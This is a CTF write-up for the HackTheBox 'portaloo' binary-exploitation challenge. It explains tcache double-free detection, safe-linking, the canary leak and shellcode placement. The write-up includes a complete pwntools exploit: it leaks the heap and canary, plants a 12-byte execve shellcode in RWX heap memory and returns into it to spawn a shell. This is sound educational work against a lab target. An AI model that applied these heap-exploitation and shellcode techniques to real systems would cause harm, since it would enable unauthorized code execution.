---
title: "HTB: portaloo Pwn Writeup"
date: 2026-03-02
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "hackthebox"
  - "htb"
  - "binary exploitation"
  - "reverse-engineering"
---

It is time to challenge myself with a more difficult pwn binary. This week I'm looking at portaloo pwn challenge from hackthebox. It is classified as medium, so there is a very good chance this one will have bugs and techniques I have never seen before. This is the link to the challenge if you want to follow along:  <https://app.hackthebox.com/challenges?tab=active&category=4>

My other pwn writeups so far can be found under this category: <https://yusuftas.net/categories/pwn/>

## Initial Look

As always, let's check security flags to see what we are dealing with. 

![Checksec results](/assets/img/portaloo_checksec.png)

Excuse me, but what is going on here? What are these two new flags: SHSTK and IBT? Okay this one is definitely going to be interesting, and probably more challenging than what I have done so far. But that is good, this is how we get better isn't it! 

Okay enough crying, time to learn something new! After a bit of searching and reading, I now have a better idea of what these two new flags are. SHSTK stands for shadow stack, and IBT is indirect branch tracking. In a short summary, they are hardware based features that come with modern CPUs to protect against control flow hijacking attacks, like ROP, JOP etc. They are part of Intel's Control-flow Enforcement Technology (CET). Shadow stack maintains a secondary copy of stack to store return addresses to prevent return addresses being overwritten by overflows and other attacks. IBT on the other hand ensures jump/call instructions land on ENDBR opcodes. I will need to come back to this to figure out how to bypass these restrictions. 

Some corrections from future me: what you see may not mean what will happen! After a bit of searching and discussions with Claude, SHSTK may not always be honoured! It depends on hardware and OS support as well as loaded dynamic libraries. **OS may disable SHSTK support if dynamic libraries are not compiled with SHSTK support.**. Since the binary comes with a prefixed glibc, let's have a look at what it was compiled with:

```
glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

How interesting, there is no SHSTK or IBT flag here. I wish I had known this earlier, I spent a good amount of time researching how to bypass SHSTK restrictions! For this binary, we can probably assume SHSTK won't be a problem at least. With that out of the way, I think we can focus more on the actual binary and see what kind of bugs it brings to the table.

> Checking security flags is important but don't get too attached to them. They may not be a problem as you expect them to be. 
{: .prompt-danger }


## Identified bugs

Let's now have a look at the decompiled code to see if we can find any bugs we can use. I will be using ghidra to get decompilation, with a bit of cleanup on my part. Main function seems to be a loop where the user can select from one of the options:

```c++

void main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  undefined4 selection;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  do {
    menu();
    __isoc99_scanf(&DAT_00102096,&selection);
    switch(selection) {
    default:
      puts("Invalid choice.");
      break;
    case 1:
      create_portal();
      break;
    case 2:
      destroy_portal();
      break;
    case 3:
      upgrade_portal();
      break;
    case 4:
      peek_into_the_void();
      break;
    case 5:
      step_into_the_portal();
      puts("\n[!] Enjoy the void..");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

Nothing seems interesting in main, at least it is a loop if we need to provide different inputs to setup a chain of attack. Let's look at other functions.

### Executable Heap

Looking at create portal function there is an interesting mprotect call:

```c++
  printf("Insert portal number: ");
  __isoc99_scanf(&DAT_00102096,&userIn);
  selected = userIn;
  if (((int)userIn < 0) || (1 < (int)userIn)) {
    puts("Choose between 0 and 1");
  }
  else if (*(long *)(slots + (long)(int)userIn * 8) == 0) {
    pvVar1 = malloc(0x20);
    *(void **)(slots + (long)(int)selected * 8) = pvVar1;
    if (*(long *)(slots + (long)(int)userIn * 8) == 0) {
      perror("malloc");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Allocated portal %d\n",(ulong)userIn);
    if (mprotect_called == 0) {
      pageSize = sysconf(0x1e);
      pageBoundAddress = (void *)(-pageSize & *(ulong *)(slots + (long)(int)userIn * 8));
      enableExecution = mprotect(pageBoundAddress,pageSize,7);
      if (enableExecution == -1) {
        perror("mprotect");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      mprotect_called = 1;
    }
  }
  else {
    puts("Portals already in use.");
  }
```

* In this one, user can allocate two 32 bytes memory regions on heap.
* Pointers to allocated memory regions are stored in **slots** global array
* For the first memory allocation, mprotect is called with **7 parameter which gives that memory region read, write and execute rights.**

Maybe we can use the first allocated version to execute some shellcode, let's see what the other functions bring to the table. 

### Use After Free (UAF)

Looking at destroy portal function, there is a big problem here: 

```c++
  printf("Insert portal number: ");
  __isoc99_scanf(&DAT_00102096,&userIn);
  if ((((int)userIn < 0) || (1 < (int)userIn)) || (*(long *)(slots + (long)(int)userIn * 8) == 0)) {
    puts("Invalid portal number.");
  }
  else {
    free(*(void **)(slots + (long)(int)userIn * 8));
    printf("Portal %d destroyed successfully!\n",(ulong)userIn);
  }
```

User selects 0 or 1 to destroy a portal / free a memory region if it has been allocated. Notice how the pointer isn't set to null after clearing the memory, and also remember that main was a loop with selection. Pointer is still there where we can reuse it to do some malicious stuff. Since the pointer is still accessed by the other parts of the code after freeing, this gives us a **use after free** bug. Let's continue looking at other parts of the code to see how we can use that bug to our advantage. 

### Writable and Readable Memory

Next two functions are upgrade_portal and peek_into_void. First one offers writing access to one of the memory regions, while the next one prints whatever is stored in those regions.

```c++

void upgrade_portal(void)

{
  long in_FS_OFFSET;
  int userIn;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Insert portal number: ");
  __isoc99_scanf(&DAT_00102096,&userIn);
  if (((userIn < 0) || (1 < userIn)) || (*(long *)(slots + (long)userIn * 8) == 0)) {
    puts("Invalid portal number.");
  }
  else {
    printf("Enter data: ");
    read(0,*(void **)(slots + (long)userIn * 8),21);
    puts("Portal upgraded.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void peek_into_the_void(void)

{
  uint i;
  
  for (i = 0; (int)i < 2; i = i + 1) {
    if (*(long *)(slots + (long)(int)i * 8) != 0) {
      printf("\nCoordinate: %d ---- Data: %.*s\n",(ulong)i,0x15,
             *(undefined8 *)(slots + (long)(int)i * 8));
    }
  }
  return;
}

```

One interesting observation is that although the memory region is 32 bytes, upgrade portal only reads and writes 21 bytes of user input to the selected portal/memory. Regardless, being able to write and read from the heap could be useful especially with the use after free bug.

### Buffer overflows

And finally we have buffer overflows in step_into_the_portal function, yes multiple overflows. And there is a reason for that. First let's have a look at what the function does:

```c++
void step_into_the_portal(void)

{
  long in_FS_OFFSET;
  undefined1 userIn [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(userIn,0,72);
  puts("\nBefore leaving this dimenson would you like to take anything with you?\n");
  items();
  printf("\n> ");
  fflush(stdout);
  read(0,userIn,80);
  printf("[!] Amazing option choosing %s",userIn);
  memset(userIn,0,72);
  printf("\nAny last words: ");
  fflush(stdout);
  read(0,userIn,104);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

* User input buffer is set to 72 bytes.
* In two different places, read is called with more bytes than the buffer can hold: 80 and 104 bytes
* Both of these read calls should overflow. First one should be just enough to overflow canary with its 8 extra bytes, and second one should be able to reach RBP and RIP, though this doesn't solve SHSTK problem. 
* There is a printf function call printing user input after the first buffer overflow.

![stack](/assets/img/portaloo_stack.png)

1. Stack canary - notice the 00 first byte
2. RBP
3. RIP

Stack canaries always start with 00 byte by design choice. Many str related functions rely on strings ending with null 00 byte to end the function. This is how they understand the end of a string. So stack canaries by design start with this null byte to prevent unintended stack leakages using string functions. This byte comes right after our buffer as the first byte of canary. 

Now what if we overflow into that null byte of stack canary? Since this is the first byte of the canary, we only need to overflow 1 byte only:

![canary 1 byte overflow](/assets/img/portaloo_canaryoverflow.png)

Looking at the received bytes from the print function call and comparing it to the values in stack, we can see the stack canary with the modified byte is received. Notice how it also printed RBP and then stopped due to 0x00 byte of the RBP ending the string now. **In short, we can now leak stack canary and RBP in that function.** We can't leak RIP after the RBP, but we don't really need that, it is something we want to override to return somewhere else. 

### Double free

This is a very new concept for me, so take whatever I document here with a grain of salt. 

Double free is an interesting concept and opened my eyes to a lot of stuff I never thought about before. Like when we allocate memory with malloc, what really happens? How does glibc decide what memory region to give, and what happens to that memory and pointer to it when we deallocate with free? These kind of questions are the ones we take for granted from the standard library, it just works right, no one really cares what is happening behind the scenes. Attackers do! All of this stuff could be open to vulnerabilities and exploits. Double free is one such concept.

It sounds like an oxymoron, like how do we free something again that has already been freed before. **UAF is one of the ways that could lead to double free: delete something, use the deleted region, delete again in simple terms.** Depending on the context, double free could lead to program crashes to arbitrary code execution. To understand how we can make use of double free to our advantage for this challenge, it is important to understand how the heap is managed at least briefly.


#### Tcache (Thread Local Cache)

Tcache was introduced in glibc 2.26 as a per-thread caching mechanism that speeds up small heap allocations. Rather than returning freed memory to the main allocator immediately, glibc keeps recently freed chunks in thread-local singly linked lists (bins), organized by size. When malloc is called, it first checks the tcache for a matching chunk before falling back to the slower main allocator. Each bin works like a stack: last in, first out (LIFO). 

When glibc places a freed chunk into tcache, it repurposes the chunk's user data area to store metadata. The first 8 bytes become the **forward pointer (fd)** pointing to the next free chunk in the bin. The second 8 bytes store a **tcache key** used to detect double frees. Let's walk through a sequence to see this in action. For clarity, I will show fd as plaintext pointers and ignore safe-linking for now.

```c
// Allocate 3 chunks of memory of same size
void *A = malloc(0x20);  // chunk at 0x1000
void *B = malloc(0x20);  // chunk at 0x1040
void *C = malloc(0x20);  // chunk at 0x1080

// All three are in use, tcache bin for this size is empty:
// Tcache bin:  HEAD ──▶ NULL    (count: 0)

// Free chunk A
free(A);  // A goes to tcache head

// A is pushed onto the head of the bin. Since the bin was empty, A's fd is NULL:
// Tcache bin:  HEAD ──▶ ┌──────────┐
//                       │ Chunk A   │
//                       │ fd = NULL │
//                       │ key = KEY │
//                       └──────────┘
//                       (count: 1)

// Free chunk B:
free(B);  // B goes to tcache head, points to A

// B is pushed onto the head. B's fd now points to A, the previous head:
// Tcache bin:  HEAD ──▶ ┌──────────┐     ┌──────────┐
//                       │ Chunk B   │     │ Chunk A   │
//                       │ fd ────────────▶│ fd = NULL │
//                       │ key = KEY │     │ key = KEY │
//                       └──────────┘     └──────────┘
//                       (count: 2)

// Free chunk C:
free(C);  // C goes to tcache head, points to B

// C is pushed onto the head. The chain is now C → B → A → NULL:

// Tcache bin:  HEAD ──▶ ┌──────────┐     ┌──────────┐     ┌──────────┐
//                       │ Chunk C   │     │ Chunk B   │     │ Chunk A   │
//                       │ fd ────────────▶│ fd ────────────▶│ fd = NULL │
//                       │ key = KEY │     │ key = KEY │     │ key = KEY │
//                       └──────────┘     └──────────┘     └──────────┘
//                       (count: 3)
```

Notice the LIFO ordering: C was freed last but is at the head. Now let's do a reallocation to see what happens

```c
void *D = malloc(0x20);  // gets chunk C (popped from head)

// Glibc pops C from the head and returns it. D now points to the same memory as old C. The bin starts at B:
// Tcache bin:  HEAD ──▶ ┌──────────┐      ┌──────────┐
//                       │ Chunk B   │      │ Chunk A   │
//                       │ fd ────────────▶│ fd = NULL │
//                       └───────────┘     └──────────┘
//                       (count: 2)
```

Another malloc would return B, then the next would return A, and after that the bin would be empty. One thing to note here is the KEY field is introduced against double free. It is set to where the tcache is stored. Whenever free is called, the heap manager checks that field to see if it is equal to the tcache address. It is a simple equality check to see if this memory has been freed before. If the KEY field is equal to the tcache address, it has been freed before and double free is detected! **This also means if we can overwrite one byte of this field, the equality check will fail and double free can't be detected!** 

At this point, one clever person might ask if the heap manager is writing the next address pointer to freed space, can't we use that to leak the heap addresses using the peek into the void function. Well, yes and no. We can leak it, but there is one more protection mechanism applied to it:

#### Safe-linking (glibc 2.32+)

In older glibc versions, the fd pointer was stored in plaintext. An attacker with a heap overflow or use-after-free could read or overwrite fd directly to hijack allocations. Starting with glibc 2.32, tcache uses **safe-linking**: the fd is XORed with a value derived from the chunk's own address:

```
stored_fd = actual_next_address ^ (this_chunk_address >> 12)
```

What we need is the address of the allocated chunk so that we can return to it and execute some shell code. We can leak the encoded fd using the peek function, but this XOR actually makes it hard to recover the actual address. To be able to get the address, we will be exploiting double free to simplify this XOR equation. 

#### Double Free in Action

The tcache key stored at offset +8 in a freed chunk is there to detect double frees. When free() is called, glibc checks whether this key is already set. If it is, the chunk might already be in the bin, and glibc aborts.

**But here is the thing: we have a UAF write!** That means we can potentially overwrite the key field of a freed chunk which can make glibc free it again. Let me walk through the double free step by step with our actual exploit to show how this works. Let's say our chunk is at address 0x5555deadb2b0.

```c
malloc(0x20);  // chunk at 0x5555deadb2b0

// The chunk is in use, slots[0] points to it, and tcache bin is empty:
// Tcache bin:  HEAD ──▶ NULL    (count: 0)

// First free
free(slots[0]);  // chunk goes to tcache, but slots[0] still points to it!

// Glibc puts the chunk into tcache and writes metadata over the user data area.
// slots[0] ──▶ ┌─────────────────────────────────┐
//   (dangling!) │ Chunk @ 0x5555deadb2b0  (FREED) │
//               │                                 │
//               │ bytes 0-7:   fd  = 0 ^ (addr>>12)│  ◄── XORed with next address = NULL
//               │ bytes 8-15:  key = TCACHE_KEY   │   ◄── double free detection
//               │ bytes 16-31: .....              │
//               └─────────────────────────────────┘
// Tcache bin:  HEAD ──▶ [Chunk 0x5555deadb2b0] ──▶ NULL   (count: 1)
```

At this point, if we tried to call free(slots[0]) again, glibc would see the key is set, check the tcache bin, find the chunk already there, and abort. So we can't double free directly. slots[0] still points to the freed chunk even though it is freed. We can use this UAF bug to overwrite the metadata stored at freed portal 0 now. Writing 16 bytes of 'A' (0x41) overwrites both the fd and the tcache key:

```c
// slots[0] ──▶ ┌─────────────────────────────────┐
//   (dangling!) │ Chunk @ 0x5555deadb2b0  (FREED) │
//               │                                  │
//               │ bytes 0-7:   0x4141414141414141   │  ◄── fd corrupted
//               │ bytes 8-15:  0x4141414141414141   │  ◄── key destroyed!
//               │ bytes 16-31: <stale data>         │
//               └─────────────────────────────────┘
// Tcache bin:  HEAD ──▶ [Chunk 0x5555deadb2b0] ──▶ ??? (corrupted fd)   (count: 1)
```

The key no longer matches what glibc expects. As far as glibc is concerned, this chunk has never been freed before. We just blinded the double free detection. So if we call free on this chunk, glibc checks the key, doesn't find the expected value, and happily inserts the chunk at the head of the tcache bin again. The chunk was already in the bin, and now it is being added to the head too. The new fd is set using safe-linking, and since the old head was this same chunk, the fd becomes a self-referencing mangled pointer:

```c
free(slots[0]);  // glibc doesn't detect the double free, chunk is inserted again!

// slots[0] ──▶ ┌──────────────────────────────────────┐
//   (dangling!) │ Chunk @ 0x5555deadb2b0  (DOUBLE FREED)│
//               │                                       │
//               │ bytes 0-7:  fd = addr ^ (addr >> 12)   │  ◄── self-referencing! Since tcache is poisoned with double free, next address and this address are the same
//               │ bytes 8-15: key = TCACHE_KEY            │  
//               │ bytes 16-31: <stale data>               │
//               └───────────┬──────────────────────────┘
//                           │  fd points back to itself!
//                           ▼
// Tcache bin:  HEAD ──▶ [Chunk 0x5555deadb2b0] ──▶ [Chunk 0x5555deadb2b0] ──▶ ???
//                                                                          (count: 2)
```

The chunk is now in the tcache bin twice, pointing to itself. This is the corrupted state we wanted. Now we use peek_into_the_void. Since slots[0] still points to the freed chunk, peek reads the first bytes which contain the self-referencing mangled fd:

```
leaked value = addr ^ (addr >> 12)
             = 0x5555deadb2b0 ^ (0x5555deadb2b0 >> 12)
             = 0x5555deadb2b0 ^ 0x00005555deadb
             = 0x55508bf0586b   (example result)
```

From this leaked value we can fully recover the original address iteratively, since the top bits are unaffected by the 12-bit shift. I actually found a similar pwn challenge writeup here:  <https://www.secquest.co.uk/white-papers/tcache-heap-exploitation>. This writeup used the following function to demangle the pointer:

```python
def safeLinkStrip(val):
    for i in range(8):
        val ^= (val >> 12) & (0xff00000000000000 >> i*8)

    return val
```

I also got Claude to write me a similar one:

```python
def demangle(leak):
    addr = leak
    for _ in range(4):
        addr = leak ^ (addr >> 12)
    return addr

heap_chunk_addr = demangle(leaked_value)
```

Interestingly with my leaked fd, I was getting the same results. I might come back to this at some point to understand why both of them worked but for now this should give us the **full heap address** directly. Trying to understand this was pretty tricky, I had to do a lot of reading, and consultations with AI. Overall I think I now better understand how tcache and some heap stuff works. If you want to read more examples and different explanations, feel free to check these links out:

1. <https://medium.com/@mrajagopalaswamy/free-and-its-hidden-details-tcache-4a49dd3b2f08>
2. <https://www.secquest.co.uk/white-papers/tcache-heap-exploitation>
3. <https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking>

## Exploit

So far we have seen some bugs and deliberate helpful points provided by the challenge:

1. Use after free and double free bug. 
2. Buffer overflows in the step into the void function.
3. Executable memory region - good candidate for some shellcode action
4. Writable memory in heap. 

We are given an executable region, so the most likely scenario is we need to execute shellcode there. But looking at the write size of 21 bytes, that could be a bit challenging. The executable region is in the heap, we need to leak where the memory in the heap is using the double free approach we discussed. If we need to return to that memory, we also need to deal with the stack canary. And hopefully we don't have to deal with SHSTK. In simple terms:

1. Leak executable code area's address using double free and peek
2. Generate some shellcode that we can somehow fit into 21 bytes. 
3. Leak stack canary in step function and overwrite return address to go back to the stored shellcode in the executable region. 

Since there is a menu with different options, I think making simplified interfaces to these functions will make writing the exploit easier. Here are some functions I created to interface into the binary:

```python
def createPortal(p, portal):
    p.sendlineafter(b'> ', b'1')     # Select create portal function
    p.sendlineafter(b'Insert portal number: ', portal)

def deletePortal(p, portal):
    p.sendlineafter(b'> ', b'2')     # Select destroy portal function
    p.sendlineafter(b'Insert portal number: ', portal)

def writePortal(p, portal, inp):
    p.sendlineafter(b'> ', b'3')     # Select upgrade portal function
    p.sendlineafter(b'Insert portal number: ', portal)    
    p.sendlineafter(b'Enter data: ', inp)    

def readPortal(p):
    p.sendlineafter(b'> ', b'4')     # Select peek portal function

    # Read printed results here
    # Note that this function assumes we will get some address printed
    p.recvuntil(b'Data: ')
    leak1 = io.recvn(6)
    leak1 = u64(leak1.ljust(8, b'\x00'))

    cleanedv1 = safeLinkStrip(leak1)
    cleanedv2 = demangle(leak1)
    print(hex(leak1))
    print(hex(cleanedv1))
    print(hex(cleanedv2))

    return cleanedv1

```

### Step 1: Heap Leak via Double Free

First we create portal 0. This is the important one since it triggers mprotect and makes the heap page executable. Then we do our double free trick to leak its address. 
After this, peeking at portal 0 gives us the self-referencing mangled pointer. We demangle it and have our heap address.

```python
def doubleFree(p, portal):
    createPortal(p, portal)
    deletePortal(p, portal)
    writePortal(p, portal, b'A'*16)
    deletePortal(p, portal)

def leakHeap(p):
    doubleFree(p, b'0')
    return readPortal(p)
```

### Step 2: Write Shellcode

Now we reclaim the chunk by creating portal 0 again. Since the chunk is at the head of the tcache bin, malloc will return the exact same memory that was mprotect'd as executable. Then we upgrade it with our shellcode. But 21 bytes for shellcode? That is tight. A standard execve("/bin/sh") shellcode needs to embed the "/bin/sh" string in the shellcode itself which surely won't fit into 21 bytes. After some thinking and discussions with Claude, I realized something clever: **we don't need to store "/bin/sh" in the shellcode at all**.

Looking at the step_into_the_portal function, the second read gives us 104 bytes into a 72 byte buffer. The stack layout after the overflow looks like:

```
bytes  0-71:   buffer padding
bytes 72-79:   canary
bytes 80-87:   saved RBP
bytes 88-95:   return address  ← we overwrite this with heap shellcode addr
bytes 96-103:  extra 8 bytes   ← we can put "/bin/sh\0" here!
```

How conveniently the buffer overflow has just enough size to fit the string! When the ret instruction pops the return address and jumps to our shellcode, RSP advances to byte 96, which is exactly where "/bin/sh\0" sits on the stack. So our shellcode just needs to do `mov rdi, rsp` and rdi will point to "/bin/sh"! The shellcode becomes:

```asm
mov rdi, rsp       ; 3 bytes — rdi points to "/bin/sh\0" on stack
xor esi, esi       ; 2 bytes — argv = NULL
xor edx, edx       ; 2 bytes — envp = NULL
push 59            ; 2 bytes — SYS_execve
pop rax            ; 1 byte
syscall            ; 2 bytes
                   ; Total: 12 bytes!
```

Let's take a moment to thank Claude for the shellcode. I am personally not ready to learn assembly yet, but thanks to AI we can get some of this stuff done easier. 12 bytes. Fits comfortably within our 21-byte limit. And the best part is this shellcode has **no hardcoded addresses in it**. We can write it to the heap before we even leak the stack canary because it doesn't depend on any addresses. It uses RSP at runtime to find "/bin/sh". 

```python
createPortal(io, b'0')

shellcode = asm('''
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    push 59
    pop rax
    syscall
''')

print(shellcode)
print(len(shellcode))

writePortal(io, b'0', shellcode.ljust(21, b'\x90'))
```

### Step 3: Return to Shellcode

Time to enter step_into_the_portal. The first read allows 80 bytes into a 72 byte buffer. That is 8 extra bytes which lands right on top of the stack canary. Remember, canaries start with a null byte by design to prevent string leaks. But if we send exactly 73 bytes, we overwrite that null byte with something non-null. Then when printf prints our input with %s, it won't stop at the canary's null byte anymore and will keep going, leaking the remaining 7 bytes of the canary plus the saved RBP until it hits another null byte.

```python
io.recvuntil(b'> ')
io.sendline(b'5')
io.recvuntil(b'> ')
io.send(b'A' * 73 )

response = io.recvuntil(b'words: ')
print(response)

leaked = response[len("[!] Amazing option choosing ") + 73:]
canary = b'\x00' + leaked[:7]  # restore the null byte
canary = u64(canary)
rbp = u64(leaked[7:13] + b'\x00\x00')

print(hex(canary))
print(hex(rbp))
```

Now for the second read which gives us 104 bytes. We know the canary, we know the heap address, and we know our shellcode is sitting there ready to execute. We just need to craft the payload:

```python
payload2  = b'A' * 72                # buffer padding
payload2 += p64(canary)              # correct canary so stack check passes
payload2 += p64(rbp)                 # restore saved RBP
payload2 += p64(heap_chunk_addr)     # return to shellcode on RWX heap
payload2 += b'/bin/sh\x00'           # RSP points here when shellcode runs!
```

When the function returns, it checks the canary (which we restored correctly), then pops RBP, then pops the return address (our heap shellcode address) into RIP. At that moment RSP points to the "/bin/sh\0" we placed right after. Shellcode runs, `mov rdi, rsp` grabs the pointer, and execve gives us a shell!

## Final Code

```python
from pwn import *


def createPortal(p, portal):
    p.sendlineafter(b'> ', b'1')     # Select create portal function
    p.sendlineafter(b'Insert portal number: ', portal)

def deletePortal(p, portal):
    p.sendlineafter(b'> ', b'2')     # Select destroy portal function
    p.sendlineafter(b'Insert portal number: ', portal)

def writePortal(p, portal, inp):
    p.sendlineafter(b'> ', b'3')     # Select upgrade portal function
    p.sendlineafter(b'Insert portal number: ', portal)    
    p.sendlineafter(b'Enter data: ', inp)    

def demangle(leak):
    """Recover address from safe-linked pointer: leak = addr ^ (addr >> 12)"""
    addr = leak
    for _ in range(4):
        addr = leak ^ (addr >> 12)
    return addr


def safeLinkStrip(val):
    for i in range(8):
        val ^= (val >> 12) & (0xff00000000000000 >> i*8)

    return val

def readPortal(p):
    p.sendlineafter(b'> ', b'4')     # Select peek portal function

    # Read printed results here
    p.recvuntil(b'Data: ')
    leak1 = io.recvn(6)
    leak1 = u64(leak1.ljust(8, b'\x00'))

    cleanedv1 = safeLinkStrip(leak1)
    cleanedv2 = demangle(leak1)
    print(hex(leak1))
    print(hex(cleanedv1))
    print(hex(cleanedv2))

    return cleanedv1

def doubleFree(p, portal):
    createPortal(p, portal)
    deletePortal(p, portal)
    writePortal(p, portal, b'A'*16)
    deletePortal(p, portal)

def leakHeap(p):
    doubleFree(p, b'0')
    return readPortal(p)



# Set up pwntools for the correct architecture
exe = './portaloo'

context.binary = exe
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']

elf  = ELF(exe)
libc = ELF('./glibc/libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

# Local
io = start()


# Leak the heap address
heap_addr = leakHeap(io)

# Craft the shellcode payload
createPortal(io, b'0')
shellcode = asm('''
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    push 59
    pop rax
    syscall
''')
print(shellcode)
print(len(shellcode))
writePortal(io, b'0', shellcode.ljust(21, b'\x90'))


# Select 5th function to step into the void
io.recvuntil(b'> ')
io.sendline(b'5')

io.recvuntil(b'> ')
io.send(b'A' * 73 )

response = io.recvuntil(b'words: ')
print(response)

leaked = response[len("[!] Amazing option choosing ") + 73:]
canary = b'\x00' + leaked[:7]  # restore the null byte
canary = u64(canary)

rbp = u64(leaked[7:13] + b'\x00\x00')
print(hex(canary))
print(hex(rbp))

# Final payload
payload2 = b'A' * 72 + p64(canary) + p64(rbp) + p64(heap_addr) +  b'/bin/sh\x00' 
io.send(payload2)

io.interactive()
```

## Reflection and Lessons Learned

This challenge taught me quite a lot of new things compared to the previous weeks:

* **Heap exploitation is a whole different beast.** Understanding tcache, safe-linking, and double frees required me to really dig into how glibc manages memory behind the scenes. It is one thing to know malloc gives you memory and free releases it, it is another thing entirely to understand the linked lists, metadata, and security mechanisms involved.

* **Security flags can be misleading.** I spent way too long worrying about SHSTK before realizing the provided glibc wasn't compiled with it. Checksec tells you what the binary was compiled with, but runtime enforcement depends on the full environment.

* **UAF is powerful.** A single missing `pointer = NULL` after free gave us the ability to leak heap addresses, bypass double free detection, and ultimately write shellcode to executable memory. 

* **Shellcode size matters.** There were clues along the binary to make it easy to figure this out. Like why the second buffer overflow was longer than needed? But still, it taught me that you don't always have to place the full shellcode into the executable area. 

There is actually something bothering me looking at this challenge. **There are two portals.** There must have been a reason to introduce a second memory chunk. We just didn't need to use it at all for some reason. **Did I actually end up finding an unintended solution with double free???** To be honest that would be very cool, first ever unintended solution! Thinking about two portals, I think there is another way to get the heap address without doing a double free. With a single free and UAF we should be able to leak  A ^ (B >> 12) and 0 ^ (B >> 12). By using these two leaks we can get the address of A. I think this post has been waaaay longer than I expected, I will leave this here for the reader to think and implement if they want to. 

This was definitely the hardest challenge so far in my series, and the most rewarding one too. Heap exploitation felt like learning a completely new skill on top of everything from previous weeks. Let's see what comes next week. As always, keep learning!